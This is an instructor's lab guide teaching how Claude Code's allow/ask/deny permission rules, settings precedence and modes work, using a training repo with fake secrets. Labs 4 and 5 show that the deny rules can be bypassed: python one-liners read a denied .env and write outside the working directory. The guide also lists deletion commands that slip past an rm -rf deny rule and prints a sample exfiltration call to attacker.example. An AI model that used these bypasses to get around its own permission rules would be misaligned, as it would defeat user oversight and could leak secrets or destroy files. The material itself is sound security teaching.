# Lab 1 — Claude Code Permissions

**Slides:** permissions · **Prerequisite:** none · **Next:** `LAB2-CLAUDE-SANDBOX.md`

Everything in this lab is fake. `.env` and `secrets/api-keys.txt` contain training placeholders only.

| Lab | Teaches | Ends at |
|---|---|---|
| 0 | Setup, workspace trust, reading the config | — |
| 1 | `allow` / `ask` / `deny` | — |
| 2 | `settings.local.json` beats `settings.json` | — |
| 3 | No rule matched → the **mode** decides | — |
| 4 | Reading `.env` anyway | **→ sandboxing lecture** |
| 5 | Editing `../cc-shared/` anyway | **→ sandboxing lecture** |

The single sentence the whole lab builds toward:

> **Permission rules are string matching, not a security boundary. A boundary needs the OS.**

---

## Lab 0 — Setup

### 0.1 Clone and run setup

```bash
git clone https://github.com/arifpucit/cc-perms-sandbox.git
cd cc-perms-sandbox
./setup.sh
```

`setup.sh` does three things you need before any lab runs:

1. Creates `../cc-shared/` — a directory **outside the repo and outside the working directory**. Every lab uses it as the "outside the boundary" target.
2. Creates `~/.lab-secrets/fake_id_rsa` — a decoy credential, so Lab 2 never points a demo at a student's real `~/.ssh`.
3. Ensures the repo is on a `main` branch, which Lab 3's `sbx --clone` mode requires.

The layout you end up with:

```
<wherever you cloned>/
├── cc-perms-sandbox/   ← git root == working directory == where you run claude
└── cc-shared/          ← outside all of it
```

The repo root **is** the project. There is no `project/` subdirectory, and that is deliberate: Claude Code reads `.claude/settings.local.json` from the **git repository root**, so making the repo root, the working directory, and the project root the same path removes an ambiguity that otherwise bites you in §2.

### 0.2 Start Claude Code from the repo root

```bash
cd cc-perms-sandbox     # NOT the parent directory
claude
```

### 0.3 ⚠️ Accept the workspace trust dialog

**This is the step that silently ruins the lab if you skip it.**

`permissions.allow` rules in a project's `.claude/settings.json` grant *capability*, so Claude Code applies them only after you accept the workspace trust dialog. This repo also **commits** `settings.local.json`, so its allow rules go through the same check.

Answer **"Yes, I trust this folder."** Deny and ask rules are unaffected — they only restrict — so if you skip this you get a confusing half-working lab where every deny fires and no allow does.

Sanity check: `python app/main.py` should run with **no prompt**. If it prompts, trust wasn't accepted.

### 0.4 The three commands students should keep reaching for

| Command | Shows |
|---|---|
| `/status` | The **Setting sources** line — every settings file actually loaded |
| `/permissions` | Every active rule **and which file it came from** |
| `/config` | The full resolved configuration |

> `claude doctor` from the shell does the same from outside a session.

**Prompt:**
```
Don't use any tools. Just tell me, from what you can see in this
project's configuration, which commands you can run without asking
me, which will make you stop and ask, and which are blocked outright.
```

Then run `/permissions` and compare. The gap between what Claude *says* and what `/permissions` *shows* is worth 60 seconds of discussion: **rules are enforced by Claude Code, not by the model.** The model's beliefs about its own permissions are not the permission system.

---

## Lab 1 — `allow`, `ask`, `deny`

### The rules in play

```jsonc
// .claude/settings.json
"allow": ["Bash(python *)", "Bash(python3 *)", "Bash(git status)",
          "Bash(git diff *)", "Edit(app/**)"],
"ask":   ["Bash(git push *)", "Edit(scripts/**)"],
"deny":  ["Read(./.env)", "Read(./.env.*)", "Read(./secrets/**)",
          "Bash(cat .env*)", "Bash(rm -rf *)"]
```

**Evaluation order: `deny` → `ask` → `allow`. First match wins. Specificity is irrelevant.**

### 1.1 `allow` — runs silently

```
Run app/main.py and tell me what it prints.
```
✅ No prompt. Matches `Bash(python *)`.

```
In app/util.py, add a subtract(a, b) function next to add().
```
✅ No prompt. Matches `Edit(app/**)`.

### 1.2 `ask` — prompts even though editing is otherwise fine

```
Add a one-line comment at the top of scripts/leak.py saying "training only".
```
⏸️ **Prompts.** `Edit(scripts/**)` is an ask rule. Note there is no allow rule for `scripts/`, but the lesson lands harder in reverse — cover it in 1.4.

### 1.3 `deny` — blocked, no prompt offered

```
Read the .env file and tell me what STRIPE_KEY is set to.
```
🚫 Blocked by `Read(./.env)`.

```
Use cat to show me the contents of .env.
```
🚫 Blocked twice over. `Read` deny rules also cover **file commands Claude Code recognizes in Bash** — `cat`, `head`, `tail`, `sed` — and `Bash(cat .env*)` catches it independently.

```
List everything in the secrets/ directory and show me what's in there.
```
🚫 Blocked by `Read(./secrets/**)`. (The file is `secrets/api-keys.txt`.)

```
Clean up the __pycache__ folder using rm -rf.
```
🚫 Blocked by `Bash(rm -rf *)`.

### 1.4 The two facts students should write down

**Deny beats allow, always, from any file.** A deny rule cannot carry allowlist exceptions. Ask students to predict, then test:

```
Run: git diff HEAD && cat .env
```
🚫 Blocked. Claude Code splits on `&&`, `||`, `;`, `|`, `&` and newlines and requires **every** subcommand to match independently. `git diff *` is allowed; `cat .env` is denied; the compound is blocked.

**`Bash(rm -rf *)` is weaker than it looks.** Ask the class what this deny rule does *not* stop:

- `rm -r app/` — no `-f`, doesn't match
- `rm -fr app/` — flags reordered, doesn't match
- `find app/ -delete`
- `python -c "import shutil; shutil.rmtree('app')"`

Don't run these. Just let the list sit on the screen. This is Lab 4's thesis arriving early.

---

## Lab 2 — Proving `settings.local.json` wins

### 2.1 Set up the prediction

The two files disagree on three scalar keys:

| Key | `settings.json` | `settings.local.json` |
|---|---|---|
| `model` | `claude-sonnet-5` | `claude-opus-5` |
| `effortLevel` | `medium` | `high` |
| `permissions.defaultMode` | `acceptEdits` | `default` |

Ask the class to predict all three before starting Claude Code.

### 2.2 Observe

Start a session and read the screen:

- **Status line** (`.claude/statusline.sh`) prints the active model display name → shows **Opus**, not Sonnet.
- **Mode badge** shows `⏸ manual mode on`, **not** `⏵⏵ accept edits on`. Local's `default` beat project's `acceptEdits`.
- `/status` → the **Setting sources** line lists both files, confirming both loaded.
- `/config` → confirms `effortLevel` is `high`.

**Local wins on every scalar key.**

Full precedence chain, highest first:

```
managed  >  CLI flags  >  settings.local.json  >  settings.json  >  ~/.claude/settings.json
```

### 2.3 ⚠️ The trap — do not skip this

Point at these two lines:

```jsonc
// settings.json          →  "ask":  ["Bash(git push *)"]
// settings.local.json    →  "deny": ["Bash(git push *)"]
```

**Prompt:**
```
Push the current branch to origin.
```
🚫 Blocked.

Now ask: *"Blocked because settings.local.json has higher priority — true or false?"*

Most students say true. **It's false**, and this is the most valuable minute of the lab.

**Permission rules do not override across files. They merge.** The `allow`, `ask`, and `deny` arrays from every scope are unioned into one combined rule set, and *within* that set the order is deny → ask → allow. The push was blocked because **deny beats ask**, which would have happened no matter which file each rule lived in.

**Prove it by swapping.** Move the `deny` into `settings.json` and the `ask` into `settings.local.json`:

```jsonc
// settings.json         →  "deny": ["Bash(git push *)"]
// settings.local.json   →  "ask":  ["Bash(git push *)"]
```

Re-run the push prompt. 🚫 **Still blocked** — now with the deny in the *lower*-priority file. File precedence never entered into it.

> Permission rules hot-reload; you don't need to restart for this swap.

### 2.4 Prove the merge directly

Add to `settings.local.json` **without touching `settings.json`**:

```jsonc
"allow": ["Bash(git log *)", "Bash(git -C ../cc-shared status)", "Bash(date)"]
```

**Prompt:**
```
Run the date command and tell me the output.
```
✅ Runs with no prompt — and every rule from `settings.json` is still active. Confirm in `/permissions`: both files' rules are listed side by side, each labelled with its source. Union, not replacement.

### 2.5 The reload asymmetry

Worth calling out explicitly:

| Key | When edits apply |
|---|---|
| `permissions` (all of it) | **Immediately** — hot reloaded |
| `model` | **Next session** — read once at startup (use `/model` mid-session) |
| `outputStyle` | Next session or `/clear` |

Students who edit `model` and wonder why the status line didn't change have found this, not a bug.

---

## Lab 3 — No matching rule → the mode decides

### 3.1 Pick tool calls that match nothing

Read the rule lists and confirm with the class that neither of these matches **any** rule in either file:

- **A —** `Edit` on `README.md` (not `app/**`, not `scripts/**`)
- **B —** `Bash(date)` (not `python`, not `git status`/`git diff`; not in the built-in read-only set)

> If you did Lab 2.4, **remove `Bash(date)` from the allow list first**, or B is no longer rule-free.

**Prompts:**
```
A: Add a line at the bottom of README.md that says "Lab run complete."
B: Run the date command and tell me the output.
```

### 3.2 Run both in each mode

`Shift+Tab` cycles `default → acceptEdits → plan`. Or start with `claude --permission-mode <mode>`.

| Mode | A — edit `README.md` | B — run `date` |
|---|---|---|
| `default` (Manual) | ⏸️ Prompts | ⏸️ Prompts |
| `acceptEdits` | ✅ Auto-approved | ⏸️ **Still prompts** |
| `plan` | 🚫 Refuses, proposes a plan instead | ⏸️ Prompts (read-only commands don't) |
| `auto` | ✅ Classifier approves | 🤖 Goes to the classifier |

### 3.3 The two callouts

**`acceptEdits` is not "yes to everything."** Row B is the point. `acceptEdits` auto-approves file edits plus a fixed list of filesystem commands — `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed` — **and only for paths inside the working directory**. `date` is none of those, so it still prompts. Students consistently expect otherwise.

**`.claude/` is a protected path.** Ask Claude to edit its own `settings.json` and it prompts in *every* mode except `bypassPermissions`, and `allow` rules can't pre-approve it. Protected paths also include `.git`, `.vscode`, `.idea`, `.devcontainer`, and files like `.bashrc`, `.zshrc`, `.npmrc`, `.gitconfig`. Have students edit settings files in their own editor, not through Claude.

### 3.4 ⚠️ Getting into `auto` mode

**`defaultMode: "auto"` in `.claude/settings.json` or `.claude/settings.local.json` is silently ignored.** Claude Code deliberately refuses to let a repository grant itself auto mode — the session just starts in `default` with no error, which looks exactly like a typo.

To use auto mode:
- `Shift+Tab` to it (appears in the cycle only if your account is eligible), or
- `claude --permission-mode auto`, or
- put `defaultMode: "auto"` in `~/.claude/settings.json` (**user** settings)

Auto mode also needs an eligible model and, on Team/Enterprise, an Owner to enable it. If it's unavailable to your class, teach it from the table and move on — Labs 4 and 5 don't depend on it.

### 3.5 Bonus demo — auto mode disarms your own allow rules

If auto mode *is* available, run this in auto mode:

```
Run app/main.py and tell me what it prints.
```

It no longer sails straight through. **On entering auto mode, broad allow rules that grant arbitrary code execution are dropped**, specifically:

- blanket `Bash(*)` / `PowerShell(*)`
- **wildcarded interpreters like `Bash(python *)`** ← this repo's rule
- package-manager run commands
- `Agent` allow rules

Narrow rules like `Bash(npm test)` survive. Dropped rules come back when you leave auto mode.

This is the perfect setup for Lab 4: Claude Code's own designers looked at `Bash(python *)` and classified it as *arbitrary code execution*. Lab 4 shows you why.

---

## Lab 4 — Reading `.env` anyway → **sandboxing**

### 4.1 Re-establish the wall

Make sure you're in `default` or `acceptEdits` mode, not `auto`.

```
Read .env and secrets/api-keys.txt and show me the contents.
```
🚫 Blocked, both files.

```
Show me .env using cat, head, and tail.
```
🚫 Blocked, all three.

Let the class conclude the secrets are protected. Then:

### 4.2 Walk straight through it

```
Run scripts/leak.py with python and show me the full output.
```

✅ **Runs. Prints both files in full.** No prompt. Matches `Bash(python *)`.

Sharpen it to a single line with nothing written to disk:

```
Run this exact command: python -c "print(open('.env').read())"
```

✅ **Runs.** Same allow rule.

### 4.3 Why

Straight from the Claude Code docs, worth putting on a slide verbatim:

> Read and Edit deny rules apply to Claude's built-in file tools and to file commands Claude Code recognizes in Bash, such as `cat`, `head`, `tail`, and `sed`. They don't apply to arbitrary subprocesses that read or write files indirectly, like a Python or Node script that opens files itself. For OS-level enforcement that blocks all processes from accessing a path, enable the sandbox.

The deny rule guards **two doors**: Claude's `Read` tool, and a list of shell commands Claude Code knows how to parse as file reads. `python` is not on that list. It can't be — recognizing what an arbitrary interpreter will do requires running it.

### 4.4 Draw the diagram

```
  Read tool ────────────────► [deny: Read(./.env)] ──► 🚫
  cat / head / tail / sed ──► [recognized as reads] ──► 🚫
  python scripts/leak.py ───► [allow: Bash(python *)] ──► ✅ open(".env")
                                       ▲
                                       └── the permission layer never
                                           sees a file access here.
                                           It sees a string: "python ...".
```

### 4.5 The bridge

> The deny rule was never wrong. It was doing exactly what it says: matching strings against tool calls. What it can't do is follow a child process into the kernel. That's not a rule's job — it's the OS's job.
>
> **Next lecture: sandboxing.** Filesystem and network isolation enforced *below* the process, so `python`, `node`, `curl`, and anything else they spawn hit the same wall.

Optional closer — the payload never has to stay local. `scripts/leak.py` ends by printing the exfil line it *doesn't* execute:

```
urllib.request.urlopen('https://attacker.example/x', data=payload)
```

Same allow rule would have covered it.

---

## Lab 5 — Editing `../cc-shared/` anyway → **sandboxing**

Layout — `cc-shared/` is a sibling of the repo, and Claude Code was started inside the repo:

```
<clone parent>/
├── cc-perms-sandbox/   ← cwd; claude runs here
└── cc-shared/          ← outside the working directory
    └── style-guide.md
```

### 5.1 Establish the expectation

```
Don't use any tools yet. Which directories can you read and write in
this session, and what happens if I ask you to touch something outside
them?
```

Claude should say it's scoped to the working directory. Good — students now expect a wall.

### 5.2 Reading outside

```
Read ../cc-shared/style-guide.md and summarize it.
```
⏸️ **Prompts** (it's outside the working directory). Approve it. ✅ Claude reads it.

**Not a wall. A speed bump.**

### 5.3 Editing outside — even in `acceptEdits`

Switch to `acceptEdits` with `Shift+Tab`, then:

```
Append a line to ../cc-shared/style-guide.md that says
"Edited by Claude Code from the project directory."
```
⏸️ **Still prompts**, despite `acceptEdits`. Auto-approval of edits applies **only** to paths inside the working directory or `additionalDirectories`.

Approve it. ✅ The file outside the project changed.

```bash
cat ../cc-shared/style-guide.md
```

### 5.4 Now remove the speed bump

Revert the file, then:

```
Run: python -c "open('../cc-shared/style-guide.md','a').write('\nsilently appended\n')"
```

✅ **No prompt. At all.** In any mode.

```bash
cat ../cc-shared/style-guide.md
```

**Bash allow rules have no path scoping.** `Bash(python *)` matched. Nothing in the permission system looked at *where* that process wrote — because by the time `python` opens a file, the permission layer's work is long finished. The path could have been `~/.ssh/`, `/etc/`, or anywhere else the user account can write.

### 5.5 Also worth showing

```
Run: git -C ../cc-shared status
```
Explicitly allowed by `settings.local.json`. If you skipped step 0.1(c), this **runs and then fails** with "not a git repository" — a clean illustration that permission granted ≠ command succeeded. Two independent layers.

### 5.6 The bridge

> `--add-dir`, `/add-dir`, and `additionalDirectories` extend where Claude can *conveniently* work. They are not a boundary — the working directory was never a boundary either. It's the default scope for prompting, and one allowed interpreter walks past it.
>
> **Next lecture: sandboxing.** An OS-enforced filesystem boundary that a child process cannot cross regardless of what the parent was allowed to run.

---

## Closing slide

| Layer | Enforces | Defeated by |
|---|---|---|
| `CLAUDE.md` guidance | Nothing | Any prompt |
| Permission modes | Baseline prompting | Approving the prompt |
| `allow` / `ask` / `deny` | String matching on tool calls | Any subprocess |
| Hooks | Custom logic per tool call | Anything the hook doesn't parse |
| **Sandbox** | **OS-level, all child processes** | ← next lecture |

Three sentences students should leave with:

1. **Deny beats ask beats allow, from any file, always.** Rules merge across files; only scalar keys like `model` and `defaultMode` obey file precedence.
2. **When nothing matches, the mode decides** — and `acceptEdits` is much narrower than its name suggests.
3. **`Bash(python *)` is a blank cheque.** Any allow rule naming an interpreter grants everything that interpreter can do, everywhere the user can reach.

The best design advice that follows: **be generous with `allow`, because `deny` is the real safety net — then remember `deny` only covers the doors Claude Code can see, and put a sandbox behind it.**

---

## Instructor notes

### Gotchas that will bite you live

| Symptom | Cause |
|---|---|
| Every `allow` rule ignored, denies all fire | Workspace trust dialog not accepted (§0.3) |
| Session starts in `acceptEdits`, not `default` | Started Claude from the parent directory, not `cc-perms-sandbox/` — `settings.local.json` never loaded (§0.2) |
| `defaultMode: "auto"` does nothing, no error | Ignored in project/local settings by design (§3.4) |
| `Bash(python *)` suddenly prompts | You're in auto mode; the rule was dropped (§3.5) |
| Model in status line doesn't change | `model` is read once at startup — restart |
| Rules from one file missing in `/permissions` | That file failed JSON validation. A settings file that fails validation is rejected **as a whole**, and won't appear in `/status`'s Setting sources line |
| `Read(./secrets/**)` not blocking | Check cwd. `./path` anchors to **current directory**; `/path` anchors to the **settings source**; `//path` is the only true absolute |

### Reset between runs

```bash
cd cc-perms-sandbox
git checkout -- . && git clean -fd
cd ../cc-shared && git checkout -- . 2>/dev/null || true
```

If students accepted "Yes, don't ask again" on anything, Claude Code appended rules to `.claude/settings.local.json` — check it before the next session and revert.

### Questions to leave hanging for the sandboxing lecture

1. `Bash(rm -rf *)` is denied. Write five commands that delete `app/` anyway.
2. If `deny` can't stop a subprocess, what's the point of `deny`?
3. What should `settings.json` look like if you assume the model has been prompt-injected by a file it read?
